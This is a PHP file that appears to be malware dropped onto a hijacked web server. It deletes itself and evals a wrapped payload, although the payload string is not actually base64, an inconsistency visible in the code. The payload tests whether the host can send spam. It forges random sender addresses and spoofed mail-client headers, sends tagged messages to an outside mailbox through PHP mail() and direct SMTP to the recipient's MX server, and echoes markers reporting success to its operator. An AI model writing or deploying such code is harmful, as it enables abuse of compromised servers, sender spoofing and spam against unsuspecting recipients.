<?php unlink(__FILE__); $xbx="//set_time_limit ( 666000 );
//@ignore_user_abort (true);

echo 'done:2';

function mailto2_imap($to, $subject, $x_message, $from, $fromAddr) {
function convert_link($string) {

preg_match_all('#(\w*://|www\.)[a-z0-9]+(-+[a-z0-9]+)*(\.[a-z0-9]+(-+[a-z0-9]+)*)+(/([^\s()<>;]+\w)?/?)?#i', $string, $matches, PREG_OFFSET_CAPTURE | PREG_SET_ORDER);
foreach (array_reverse($matches) as $match) {
  $a = '<a href="'.(strpos($match[1][0], '/') ? '' : 'http://') . $match[0][0].'">' . $match[0][0] . '</a>';
  $string = substr_replace($string, $a, $match[0][1], strlen($match[0][0]));
}
return  $string;
}

$boundary=md5(uniqid(rand()));
$header = "From: $from<". $fromAddr .">\n";
$header .= "Reply-To: $from". $fromAddr ."\n";
$header .= "MIME-Version: 1.0"."\n";
$header .= "Content-type: multipart/alternative; boundary=\"----=_NextPart_" . $boundary . "\"";

$message = "This is multipart message using MIME\n";

$message .= "------=_NextPart_" . $boundary . "\n";
$message .= "Content-Type: text/plain; charset=UTF-8\n";
$message .= "Content-Transfer-Encoding: 7bit". "\n\n";
$message .= $x_message . "\n\n";
$message .="------=_NextPart_" . $boundary . "\n";
$message .="Content-Type: text/html; charset=UTF-8\n";
$message .= "Content-Transfer-Encoding: 7bit". "\n\n";



$html  = "<p><span>";
$html .=  str_replace("\n", "</span><br /><br /><span>", $x_message);
$html .=  "</span></p>";

$html = convert_link($html);

$message .="<html>
<body>
<left>
<b>" . $html . "</b>
</left>
</body>
</html>\n\n";
$message .= "------=_NextPart_" . $boundary . "--";

return imap_mail($to, $subject, $message, $header);

}


function mailto2($to, $subject, $x_message, $from, $fromAddr) {
function convert_link($string) {

preg_match_all('#(\w*://|www\.)[a-z0-9]+(-+[a-z0-9]+)*(\.[a-z0-9]+(-+[a-z0-9]+)*)+(/([^\s()<>;]+\w)?/?)?#i', $string, $matches, PREG_OFFSET_CAPTURE | PREG_SET_ORDER);
foreach (array_reverse($matches) as $match) {
  $a = '<a href="'.(strpos($match[1][0], '/') ? '' : 'http://') . $match[0][0].'">' . $match[0][0] . '</a>';
  $string = substr_replace($string, $a, $match[0][1], strlen($match[0][0]));
}
return  $string;
}

$boundary=md5(uniqid(rand()));
$header = "From: $from<". $fromAddr .">\n";
$header .= "Reply-To: $from". $fromAddr ."\n";
$header .= "MIME-Version: 1.0"."\n";
$header .= "Content-type: multipart/alternative; boundary=\"----=_NextPart_" . $boundary . "\"";

$message = "This is multipart message using MIME\n";

$message .= "------=_NextPart_" . $boundary . "\n";
$message .= "Content-Type: text/plain; charset=UTF-8\n";
$message .= "Content-Transfer-Encoding: 7bit". "\n\n";
$message .= $x_message . "\n\n";
$message .="------=_NextPart_" . $boundary . "\n";
$message .="Content-Type: text/html; charset=UTF-8\n";
$message .= "Content-Transfer-Encoding: 7bit". "\n\n";



$html  = "<p><span>";
$html .=  str_replace("\n", "</span><br /><br /><span>", $x_message);
$html .=  "</span></p>";

$html = convert_link($html);

$message .="<html>
<body>
<left>
<b>" . $html . "</b>
</left>
</body>
</html>\n\n";
$message .= "------=_NextPart_" . $boundary . "--";

return mail($to, $subject, $message, $header);

}


function Mail_MessageId($domain)
{
  $gr1 = sprintf("%03d", rand() % 10);
  $gr2 = sprintf("%01X", rand() % 16);
  $gr3 = sprintf("%04X", rand() % 65536);
  $gr4 = sprintf("%04X", rand() % 65536);
  $gr5 = sprintf("%04X", rand() % 65536);
  $gr6 = sprintf("%04X", rand() % 65536);
  $gr7 = sprintf("%04X", rand() % 65536);

  $messageId = $gr1.strtolower($gr2).'01c4'.strtolower($gr3).'\$'.
    strtolower($gr4).strtolower($gr5).'\$'.strtolower($gr6).strtolower($gr7).'@'.$domain;

  $boundary  = '----=_NextPart_000_'.$gr1.(sprintf("%01X", rand() % 16)).'_01C4'.$gr7.'.'.$gr6.$gr5;

  return array($messageId, $boundary);
}


function generateMessageID()
{
  return sprintf(
    "<%s.%s@%s>",
    base_convert(time(), 10, 36),
    base_convert(bin2hex(openssl_random_pseudo_bytes(8)), 16, 36),
    $_SERVER['SERVER_NAME']
  );
}


function sendmail($to='', $subject='', $message='', $headers='', $extra='')
{



$b = ini_get('sendmail_path');
if (strlen($b) >= 4) {
    echo $b;
} else {
    $b = "/usr/sbin/sendmail -t $extra";
    echo $b;
}




 $fd = popen($b, 'w');


 fputs($fd, "To: $to\n");
 fputs($fd, "Subject: $subject\n");
// fputs($fd, "X-Mailer: PHP/" . phpversion() . "\n");


 if ($headers)
  fputs($fd, "$headers\n");

 fputs($fd, "\n");
 fputs($fd, $message);
 pclose($fd);
}


function authSendEmail($from, $fromname, $to, $toname, $subject, $message, $html_MINE, $mode)
{

  /* * * * CONFIGURATION START * * * */
  $smtpServer = 'localhost';

if ($mode == 'DI'){ 
$host = substr(strstr($to, '@'), 1)."."; 
getmxrr($host, $mx_records, $mx_weight);
for($i=0;$i<count($mx_records);$i++){$mxs[$mx_records[$i]] = $mx_weight[$i];}
asort ($mxs);
$records = array_keys($mxs);
$smtpServer = $records[0];
}

if ($mode == 'PX'){ $smtpServer = 'localhost';}


  $port       = 25;
  $timeout    = 10;
  $username   = 'none';
  $password   = 'none';
  $identify   = $_SERVER['REMOTE_ADDR'];
$identify   = $_SERVER['HTTP_HOST'];


$vv = $_SERVER['HTTP_HOST'];
$vv = str_replace('www.', '', $vv);
$identify   = str_replace('WWW.', '', $vv);



  $newLine = "\r\n";
  /* * * * CONFIGURATION END * * * * */

$o_mailer = 'Ximian Evolution 2.3.1 (2.0.1-6)#The Bat! (v2.00.9) Personal#Apple Mail (2.552)#Ximian Evolution 1.0.3 (1.0.3-6)#Ximian Evolution 2.0.1 (2.0.1-6)#The Bat! (v2.00.3) Personal#Mailman v2.0.8#The Bat! (v2.00.9) Personal#Microsoft Outlook Express 6.00.2800.1158#MIME-tools 5.41 (Entity 5.404)#Microsoft Outlook Express 6.00.2800.1158#Pegasus Mail for Win32 (v3.12c)#Microsoft Outlook Express 6.00.2900.2180#Mutt 1.0.1i#Microsoft Office Outlook, Build 11.0.5510#Microsoft Outlook Express 6.00.2800.1158#Sylpheed version 0.7.6 (GTK+ 1.2.10; i686-pc-tommie-gnu)#Microsoft Outlook Express 6.00.2900.2180#Evolution/1.0-5mdk#IPB PHP Mailer#Microsoft Outlook Express 6.00.2800.1158#Microsoft Office Outlook, Build 11.0.5510#IPB PHP Mailer#acme Mail#Apple Mail#Balsa#Becky!#Bloomba#Citadel#Claris Emailer#Claws Mail#Courier#EmailTray#Eudora#Forte Agent#Foxmail#Geary#GNUMail#KMail#IBM Notes & Domino#Mail#Mailbird#Microsoft Office Outlook#Modest#Mozilla Thunderbird#Mulberry#Novell Evolution#Novell GroupWise#Opera Mail#Pegasus Mail#i.Scribe/InScribe#SeaMonkey Mail & Newsgroups#Sylpheed#Sparrow#Spicebird#The Bat!#TouchMail#Windows Live Mail#YAM#Alpine#Elm#Gnus#mailx#MH#MUSH#Mutt#Pine#sendEmail#Turnpike#Upas#24SevenOffice#Alpine#Bongo#Citadel#Horde IMP#Hula project#Kerio WebMail#Mailpile#OpenGroupware Webmail#RoundCube Webmail#SquirrelMail#WebPine#Touchmail#Zimbra';
$s_mailer = explode('#',  $o_mailer);   

$o_charsets = 'iso-8859-1#us-ascii#Windows-1252#Windows-1251#utf-8#UTF-8';
$s_charsets = explode('#',  $o_charsets);   


  $smtpConnect = @fsockopen($smtpServer, $port, $errno, $errstr, $timeout);
  
  if(empty($smtpConnect)) {
    $logArray['errno'] = $errno;
    $logArray['errstr'] = $errstr;
    $logArray['connection'] = "Failed to connect";
    $logArray['SUCCESS'] = "FALSE";
    return $logArray;
  }
  
  
  stream_set_timeout($smtpConnect, $timeout);
  
  $smtpResponse = fgets($smtpConnect, 515);
  $info = stream_get_meta_data($smtpConnect);
  if ($info['timed_out']) {
    $logArray['connection'] = "Timeout: $smtpResponse";
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  $logArray['connection'] = "Connected: $smtpResponse";
  
  

//  fputs($smtpConnect,"EHLO ".$identify . $newLine);
  fputs($smtpConnect,"EHLO ".$identify . $newLine);
  $logArray['ehlo'] = fgets($smtpConnect, 515);
  $info = stream_get_meta_data($smtpConnect);
  
  $i=0;
  while (!($info['timed_out'] || $info['unread_bytes'] == 0)) {
    $logArray['ehlo'] .= fgets($smtpConnect, 515);
    $info = stream_get_meta_data($smtpConnect);
    $i++;
  }
  if ($i=0) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  
 
  

  fputs($smtpConnect, "MAIL FROM: <".$from.">" . $newLine);
  $logArray['mailfrom'] = fgets($smtpConnect, 515);
  if (false === strpos($logArray['mailfrom'],"250")) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  
  

  fputs($smtpConnect, "RCPT TO: <".$to.">" . $newLine);
  $logArray['mailto'] = fgets($smtpConnect, 515);
  if (false === strpos($logArray['mailto'],"250")) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
//else{if ($mode == 'DI'){echo '##777##' . $to . '##888##';  }}

  

  fputs($smtpConnect, "DATA" . $newLine);
  $logArray['data1'] = fgets($smtpConnect, 515);
  if (false === strpos($logArray['data1'],"354")) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  


$mess_id = generateMessageID();
$mess_id = str_replace('WWW.', '', $mess_id);
$mess_id = str_replace('www.', '', $mess_id);

$toname ='';

$Momentn = time().".".md5(rand(1000,9999));
$ip = intval(rand()%255).'.'.intval(rand()%255).'.'.intval(rand()%255).'.'.intval(rand()%255);

 list($messageId, $boundary) = Mail_MessageId($identify);


//  $headers = "To: " . $to . $newLine;
  $headers = "From: ". $fromname." <".$from.">" . $newLine;
  $headers .= "Subject: ".$subject.$newLine;
  $headers .= "Reply-To: ". $fromname." <".$from.">" . $newLine;
//  $headers .= "Return-Path: ". $fromname." <".$from.">" . $newLine;
//  $headers .= "Message-ID: <".$Momentn."@".$identify.">". $newLine;
  $headers .= "Message-ID: <". $messageId  .">". $newLine;
  $headers .= 'Date: '. date("D, j M Y H:i:s O") . $newLine;
  //$headers .= 'Sender-IP: '. $ip  . $newLine;
//  $headers .= "X-Mailer: PHP/" . phpversion() . $newLine;
 // $headers .= "X-Mailer: " . $s_mailer[array_rand($s_mailer)] . $newLine;

  $headers .= "MIME-Version: 1.0" . $newLine;
  $headers .= 'Content-Transfer-Encoding: quoted-printable' . $newLine;


//  

  if ($html_MINE == 'yes') {
    $headers .= "Content-type: text/html; charset=iso-8859-1" . $newLine;
  }
  else {
    $headers .= 'Content-type: text/plain; charset="UTF-8"' . $newLine;
  }

// $headers .= "Content-Transfer-Encoding: 8bit" . $newLine . $newLine;

//  $message = wordwrap($message, 70, "\r\n");  


$header= 'Date: '. date("D, j M Y H:i:s O") . $newLine;
$header.= "From: ". $fromname." <".$from.">" . $newLine;
$header.="X-Mailer: The Bat! (v3.99.3) Professional\r\n";
$header.= "Reply-To: ". $fromname." <".$from.">" . $newLine;
$header.="X-Priority: 3 (Normal)\r\n";
$header.="Message-ID: <" .  mt_rand(111111111, 999999999)  . ".".date("YmjHis")."@$identify>\r\n";
//$header .= "Message-ID: <". $messageId  .">". $newLine;
$header.="To: <" . $to . ">\r\n";
$header .= "Subject: ".$subject.$newLine;
$header.="MIME-Version: 1.0\r\n";
$header.="Content-Type: text/plain; charset=windows-1251\r\n";
$header.="Content-Transfer-Encoding: 8bit\r\n";

$headers = $header;


$identify = substr(strstr($from, '@'), 1);

$charset = 'utf-8';
$type = 'plain';
//$to_name = 'Joseph Kied';
$to_email = $to;
$error_email = 'errors@' . $identify;
$unsub = 'http://' . $identify . '/unsubscribe';




        $a_header = "Date: ".date("D, d M Y H:i:s") . " UT\r\n";
        $a_header .= "Message-ID: <". $messageId  .">". $newLine;
        $a_header .= "Subject: =?" . $charset . "?B?" . base64_encode($subject) . "=?=\r\n";
        $a_header .= "Reply-To: " . $fromname . " <" . $from . ">\r\n";
        $a_header .= "MIME-Version: 1.0\r\n";
        $a_header .= "Content-Type: text/" . $type . "; charset=\"" . $charset . "\"\r\n";
        $a_header .= "Content-Transfer-Encoding: 8bit\r\n";
        $a_header .= "From: " . $fromname . " <" . $from . ">\r\n";
        $a_header .= "To: " . $to_name . " <" . $to_email . ">\r\n";
       // $a_header .= "Errors-To: <" . $error_email . ">\r\n";
       // $a_header .= "X-Complaints-To: " . $error_email . "\r\n";
       // $a_header .= "List-Unsubscribe: <$unsub>\r\n";
//        if(!empty($list_id)) $a_header .= "List-id: <" . $list_id . ">\r\n";
    //    $a_header .= "Precedence: bulk\r\n";


$headers = $a_header;



  $message = str_replace("\n.", "\n..",$message);
  
  
  fputs($smtpConnect, $headers.$newLine.$message.$newLine.".".$newLine);
  $logArray['data2'] = fgets($smtpConnect, 515);
  if (false === strpos($logArray['data2'],"250")) {
    $logArray['SUCCESS'] = "FALSE";
    fclose($smtpConnect);
    return $logArray;
  }
  

  fputs($smtpConnect,"QUIT" . $newLine);
  $logArray['quit'] = fgets($smtpConnect, 515);
  
  fclose($smtpConnect);
  $logArray['SUCCESS'] = "TRUE";
  echo '##777##' . $to . '##888##';


   return $logArray;

}

function generateRandomString($length = 10) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}



echo '##START_DATA##';
$i = 0;

$names = explode(',' , 'Mary,Patricia,Linda,Barbara,Elizabeth,Jennifer,Maria,Susan,Margaret,Dorothy,Lisa,Nancy,Karen,Betty,Helen,Sandra,Donna,Carol,Naomi,Christina,Angelina,Scarlett,Stacey,Shannon,Selena,Jaden,Matt,Robert,Justin,Megan,Ryan,Penalope,Olivier,Tom,Miley,Freddie,Stuart,Blake,Pamela,Elle,Brad,Johnny,Vincent,Mia,Cameron,Daniela,Ben,Jessica,Will,Tisha,Heather,Vin,Tommy,Mara,Salma,Timothy');
$servers = explode(',' , 'hotmail.com,yahoo.com,gmail.com,mail.com');

//$s_mailer[array_rand($s_mailer)] . $newLine;

$vv = $_SERVER['HTTP_HOST'];
$vv = str_replace('www.', '', $vv);
$from_mail_server = str_replace('WWW.', '', $vv);

 
$f_name = $names[array_rand($names)];

$from_email =  $f_name .'@'  . $servers[array_rand($servers)];
//$from_email =  $f_name .'@'  . $from_mail_server;
$from_user = $f_name;

$value = 'adhupe@mail.com';
$toname = 'Boris';



$x_body = 'Hi! ' . mt_rand(1,10000) . ' How are You!???';


$headers =  	       

               "From: $from_user <$from_email>\n".
	       "Reply-To: <$from_email>\n" .
               "MIME-Version: 1.0" . "\n" ;
               'Content-type: text/plain; charset=iso-8859-1\n' .
               "Content-Transfer-Encoding: 8bit\n";

$x_subject = 'MA- ##1499886##';
//mailto2($value, $x_subject,  $x_body, $from_user, $from_email );

mail($value, $x_subject,  $x_body, $headers);

$x_subject = 'IM- ##1499886##';
mail($value, $x_subject,  $x_body);


$x_subject = 'FI- ##1499886##';
//sendmail($value, $x_subject, $x_body,  $headers);


$SENDMAIL_TYPE = 'DI';
$x_subject = 'DI- ##1499886##';
authSendEmail($from_email, $from_user, $value, $toname, $x_subject, $x_body, $html_MINE, $SENDMAIL_TYPE);


$x_subject = 'PX- ##1499886##';
$SENDMAIL_TYPE = 'PX';
//authSendEmail($from_email, $from_user, $value, $toname, $x_subject, $x_body, $html_MINE, $SENDMAIL_TYPE);



echo '##END_DATA##';
exit;





"; eval(base64_decode($xbx));
